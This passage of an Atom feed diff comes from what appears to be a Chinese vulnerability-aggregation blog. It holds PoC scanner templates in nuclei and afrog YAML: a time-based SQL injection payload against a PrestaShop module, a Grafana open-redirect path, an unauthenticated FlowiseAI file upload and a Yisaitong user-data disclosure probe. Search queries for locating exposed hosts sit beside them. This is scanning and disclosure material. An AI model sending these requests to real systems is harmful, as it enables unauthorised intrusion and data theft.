class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br><br>    <span class="hljs-params">host-redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;contains_any(tolower(response), <span class="hljs-string">&quot;prestashop&quot;</span>, <span class="hljs-string">&quot;possearchproducts&quot;</span>)&#x27;<br>        <span class="hljs-params">internal:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        @<span class="hljs-params">timeout:</span> <span class="hljs-number">20</span>s<br>        POST <span class="hljs-symbol">/modules/possearchproducts/SearchProducts.php</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">id_category</span><span class="hljs-operator">=</span><span class="hljs-number">10</span><span class="hljs-operator">*</span><span class="hljs-keyword">if</span>(now()<span class="hljs-operator">=</span>sysdate()%<span class="hljs-number">2</span>Csleep(<span class="hljs-number">10</span>)%<span class="hljs-number">2</span>C0)&amp;id_lang<span class="hljs-operator">=</span><span class="hljs-number">3</span>&amp;resultsPerPage<span class="hljs-operator">=</span><span class="hljs-number">10</span>&amp;s<span class="hljs-operator">=</span>the<br><br>    <span class="hljs-params">host-redirects:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> &#x27;duration<span class="hljs-operator">&gt;=</span><span class="hljs-number">10</span>&#x27;<br>          <span class="hljs-operator">-</span> &#x27;contains(tolower(response), <span class="hljs-string">&quot;products&quot;</span>)&#x27;<br>          <span class="hljs-operator">-</span> &#x27;status_code <span class="hljs-operator">!=</span> <span class="hljs-number">404</span>&#x27;<br>        <span class="hljs-params">condition:</span> and<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>elFinder 命令注入漏洞</title>
+    <link href="http://example.com/2025/06/10/github_3052878996/"/>
+    <id>http://example.com/2025/06/10/github_3052878996/</id>
+    <published>2025-06-10T03:38:08.244Z</published>
+    <updated>2025-06-10T03:38:08.242Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> elFinder 命令注入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2019-9194</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> elFinder 2.1.48之前版本中的PHP连接器存在命令注入漏洞，由于未对输入进行充分过滤，攻击者可通过发送特制请求执行任意命令。</p><p><strong>产品厂商：</strong> elFinder</p><p><strong>产品名称：</strong> elFinder</p><p><strong>影响版本：</strong> version &lt; 2.1.48</p><p><strong>搜索语法：</strong> http.title:”elfinder”</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/issues/12288">https://github.com/projectdiscovery/nuclei-templates/issues/12288</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><h4 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h4><blockquote><p>elFinder before 2.1.48 contains a command injection caused by unsanitized input in the PHP connector, letting attackers execute arbitrary commands, exploit requires attacker to send crafted requests.</p></blockquote><h5 id="Severity-Critical"><a href="#Severity-Critical" class="headerlink" title="Severity: Critical"></a>Severity: <code>Critical</code></h5><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul><li><a href="https://www.exploit-db.com/exploits/46481/">https://www.exploit-db.com/exploits/46481/</a></li><li><a href="https://www.exploit-db.com/exploits/46539/">https://www.exploit-db.com/exploits/46539/</a></li><li><a href="https://github.com/cved-sources/cve-2019-9194">https://github.com/cved-sources/cve-2019-9194</a></li></ul><h4 id="KEV-True"><a href="#KEV-True" class="headerlink" title="KEV: True"></a>KEV: True</h4><h4 id="Shodan-Query-http-title-elfinder"><a href="#Shodan-Query-http-title-elfinder" class="headerlink" title="Shodan Query: http.title:&quot;elfinder&quot;"></a>Shodan Query: <code>http.title:&quot;elfinder&quot;</code></h4><blockquote><p>Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(<code>-debug</code>) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. </p></blockquote><blockquote><p>Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made.</p></blockquote><p>You can check the FAQ for the Nuclei Templates Community Rewards Program <a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/Community-Rewards-FAQ.md">here</a>.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>安恒信息AI数据分类分级20：让效率提升60倍</title>
+    <link href="http://example.com/2025/06/10/weixin_1127159762/"/>
+    <id>http://example.com/2025/06/10/weixin_1127159762/</id>
+    <published>2025-06-10T02:44:45.219Z</published>
+    <updated>2025-06-10T02:44:45.218Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/DPA8xmRKzMfgs1PjNiUfXg">https://mp.weixin.qq.com/s/DPA8xmRKzMfgs1PjNiUfXg</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 安恒信息CERT&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/DPA8xmRKzMfgs1PjNiUfXg&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="安恒信息CERT" scheme="http://example.com/tags/%E5%AE%89%E6%81%92%E4%BF%A1%E6%81%AFCERT/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>emlog pro-257-258 SQL注入漏洞</title>
+    <link href="http://example.com/2025/06/10/weixin_2538663856/"/>
+    <id>http://example.com/2025/06/10/weixin_2538663856/</id>
+    <published>2025-06-10T02:24:06.979Z</published>
+    <updated>2025-06-10T02:24:06.977Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> Nday Poc</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/zH2vlWSZPoUOgKwwi2XiZw">https://mp.weixin.qq.com/s/zH2vlWSZPoUOgKwwi2XiZw</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; Nday Poc&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/zH2vlWSZPoUOgKwwi2XiZw&quot;&gt;https://mp.weixin.</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="Nday Poc" scheme="http://example.com/tags/Nday-Poc/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>速修！Kafka Connect爆任意文件读取漏洞，无需授权</title>
+    <link href="http://example.com/2025/06/10/weixin_392578990/"/>
+    <id>http://example.com/2025/06/10/weixin_392578990/</id>
+    <published>2025-06-10T02:23:28.693Z</published>
+    <updated>2025-06-10T02:23:28.688Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 微步在线研究响应中心</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/ICN9gsCRIH1mptM1nVt8eQ">https://mp.weixin.qq.com/s/ICN9gsCRIH1mptM1nVt8eQ</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 微步在线研究响应中心&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/ICN9gsCRIH1mptM1nVt8eQ&quot;&gt;https://mp.weixi</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="微步在线研究响应中心" scheme="http://example.com/tags/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF%E7%A0%94%E7%A9%B6%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Grafana开放重定向&amp;服务端请求伪造漏洞</title>
+    <link href="http://example.com/2025/06/10/github_3060962644/"/>
+    <id>http://example.com/2025/06/10/github_3060962644/</id>
+    <published>2025-06-10T02:15:54.901Z</published>
+    <updated>2025-06-10T02:15:54.898Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> Grafana开放重定向&amp;服务端请求伪造漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-4123</li></ul><p><strong>漏洞类型：</strong> 服务器端请求伪造</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该漏洞允许攻击者通过自定义前端插件将用户重定向到恶意网站，并执行任意 JаvаSсriрt 代码。</p><p><strong>产品厂商：</strong> Grafana</p><p><strong>产品名称：</strong> Grafana</p><p><strong>影响版本：</strong> 8.0.0 ≤ version &lt;10.4.18、11.2.0 ≤ version &lt;11.2.9、11.3.0 ≤ version &lt;11.3.6、11.4.0 ≤ version &lt;11.4.4、11.5.0 ≤ version &lt;11.5.4、11.6.0 ≤ version &lt;11.6.1、12.0.0 ≤ version &lt;12.0.1</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-4123.yaml">https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-4123.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">4123</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Grafana开放重定向&amp;服务端请求伪造漏洞<br>  <span class="hljs-params">author:</span> free2e<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    该漏洞允许攻击者通过自定义前端插件将用户重定向到恶意网站，并执行任意 JаvаSсriрt 代码。<br>  <span class="hljs-params">affected:</span> <span class="hljs-number">8.0</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">10.4</span>.<span class="hljs-number">18</span> 、<span class="hljs-number">11.2</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.2</span>.<span class="hljs-number">9</span> 、<span class="hljs-number">11.3</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.3</span>.<span class="hljs-number">6</span>、 <span class="hljs-number">11.4</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.4</span>.<span class="hljs-number">4</span> 、<span class="hljs-number">11.5</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.5</span>.<span class="hljs-number">4</span> 、<span class="hljs-number">11.6</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.6</span>.<span class="hljs-number">1</span> 、 <span class="hljs-number">12.0</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">12.0</span>.<span class="hljs-number">1</span> <br>  <span class="hljs-params">solutions:</span> 目前厂商已发布升级补丁以修复漏洞https:<span class="hljs-operator">//</span>grafana.com<span class="hljs-operator">/</span>security<span class="hljs-operator">/</span>security-advisories<span class="hljs-operator">/</span>cve-<span class="hljs-number">202</span>5-<span class="hljs-number">4123</span><span class="hljs-operator">/</span>、https:<span class="hljs-operator">//</span>grafana.com<span class="hljs-operator">/</span>blog<span class="hljs-operator">/</span><span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span><span class="hljs-number">21</span><span class="hljs-operator">/</span>grafana-security-release-high-severity-security-fix-for-cve-<span class="hljs-number">202</span>5-<span class="hljs-number">4123</span><span class="hljs-symbol">/</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//mp.weixin.qq.com/s/URckOUcTYvZR4rh9MS9T_w</span><br>  <span class="hljs-params">tags:</span> Grafana、CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">4123</span><br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> GET<br>      <span class="hljs-params">path:</span> <span class="hljs-operator">/</span>public<span class="hljs-operator">/</span>..%<span class="hljs-number">2</span>F%<span class="hljs-number">5</span>ddfaggust.pro%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>f%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..<br>    <span class="hljs-params">expression:</span> |<br>      response.status <span class="hljs-operator">==</span> <span class="hljs-number">302</span> <span class="hljs-operator">&amp;&amp;</span> <br>      response.headers[<span class="hljs-string">&quot;location&quot;</span>].contains(<span class="hljs-string">&quot;dfaggust.pro&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> <br>      response.body.bcontains(b&#x27;<span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-string">&quot;/]dfaggust.pro/?/../../&quot;</span><span class="hljs-operator">&gt;</span>Found<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span>.&#x27;)<br><span class="hljs-params">expression:</span> r0()<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="服务器端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>FlowiseAI 未授权任意文件写入漏洞</title>
+    <link href="http://example.com/2025/06/10/github_210052671/"/>
+    <id>http://example.com/2025/06/10/github_210052671/</id>
+    <published>2025-06-10T02:15:41.307Z</published>
+    <updated>2025-06-10T02:15:41.305Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> FlowiseAI 未授权任意文件写入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-26319</li></ul><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> FlowiseAI 是一款开源的低代码&#x2F;无代码工具，用于快速构建基于大语言模型（LLM）的应用程序。该漏洞存在于 Flowise 的 &#x2F;арi&#x2F;v1&#x2F;аttасhmеntѕ 中，允许未经身份验证的攻击者通过“知识上传”功能将任意文件上传到托管代理的服务器，此缺陷可能使攻击者能够通过上传恶意文件、脚本、配置文件甚至 SSH 密钥来远程控制整个服务器。</p><p><strong>产品厂商：</strong> FlowiseAI</p><p><strong>产品名称：</strong> FlowiseAI</p><p><strong>搜索语法：</strong> app&#x3D;”FlowiseAI”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-26319.yaml">https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-26319.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">26319</span><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> FlowiseAI 未授权任意文件写入漏洞<br>  <span class="hljs-params">author:</span> avic123<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    FlowiseAI 是一款开源的低代码<span class="hljs-operator">/</span>无代码工具，用于快速构建基于大语言模型（LLM）的应用程序。该漏洞存在于 Flowise 的 <span class="hljs-operator">/</span>арi<span class="hljs-operator">/</span>v1<span class="hljs-operator">/</span>аttасhmеntѕ 中，允许未经身份验证的攻击者通过“知识上传”功能将任意文件上传到托管代理的服务器，此缺陷可能使攻击者能够通过上传恶意文件、脚本、配置文件甚至 SSH 密钥来远程控制整个服务器。<br>    fofa：app<span class="hljs-operator">=</span><span class="hljs-string">&quot;FlowiseAI&quot;</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//mp.weixin.qq.com/s/Htyu1_SpOvAYb1VaZDYGjA</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,flowiseAI,fileupload<br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/06/10</span><br><br><span class="hljs-params">set:</span><br>  <span class="hljs-params">hostname:</span> request.url.host<br>  <span class="hljs-params">randstr:</span> randomLowercase(<span class="hljs-number">8</span>)<br>  <span class="hljs-params">rboundary:</span> randomLowercase(<span class="hljs-number">33</span>)<br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> POST<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/api/v1/attachments/test/test</span><br>      <span class="hljs-params">headers:</span><br>        <span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span><span class="hljs-operator">-</span>-------&#123;&#123;rboundary&#125;&#125;<br>      <span class="hljs-params">body:</span> |<br><br>        <span class="hljs-operator">-</span>---------&#123;&#123;rboundary&#125;&#125;<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;&#123;randstr&#125;&#125;.txt&quot;</span><br>        <span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span> <br><br>        &#123;&#123;randstr&#125;&#125;<br>        <span class="hljs-operator">-</span>---------&#123;&#123;rboundary&#125;&#125;--<br>    <span class="hljs-params">expression:</span> response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b&#x27;<span class="hljs-string">&quot;name&quot;</span>&#x27;) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b&#x27;<span class="hljs-string">&quot;content&quot;</span>:&#x27;) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(bytes(randstr))<br><br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;注: 本模块来自 AI 可能存在错误 &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+    <category term="zan8in/afrog:github commit" scheme="http://example.com/tags/zan8in-afrog-github-commit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞</title>
+    <link href="http://example.com/2025/06/10/github_2974453440/"/>
+    <id>http://example.com/2025/06/10/github_2974453440/</id>
+    <published>2025-06-10T02:15:26.763Z</published>
+    <updated>2025-06-10T02:15:26.909Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> 亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞</p><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 亿赛通电子文档安全管理系统 &#x2F;CDGServer3&#x2F;openapi&#x2F;getAllUsers 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。</p><p><strong>产品厂商：</strong> 亿赛通</p><p><strong>产品名称：</strong> 电子文档安全管理系统</p><p><strong>搜索语法：</strong> body&#x3D;”&#x2F;CDGServer3&#x2F;index.jsp”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fvulnerability%2Fyisaitong-getallusers-disclosure.yaml">https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fvulnerability%2Fyisaitong-getallusers-disclosure.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> yisaitong-getallusers-disclosure<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> 亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞<br>  <span class="hljs-params">author:</span> Superhero<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |-<br>    <span class="hljs-params">fofa:</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;/CDGServer3/index.jsp&quot;</span><br>    亿赛通电子文档安全管理系统 <span class="hljs-symbol">/CDGServer3/openapi/getAllUsers</span> 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>mp.weixin.qq.com<span class="hljs-operator">/</span>s<span class="hljs-operator">?</span>__biz<span class="hljs-operator">=</span>MzkzMTcwMTg1Mg<span class="hljs-operator">==</span>&amp;mid<span class="hljs-operator">=</span><span class="hljs-number">2247486682</span>&amp;idx<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;sn<span class="hljs-operator">=</span><span class="hljs-number">668809</span>e5f2f46672da6cf65f924a2697&amp;chksm<span 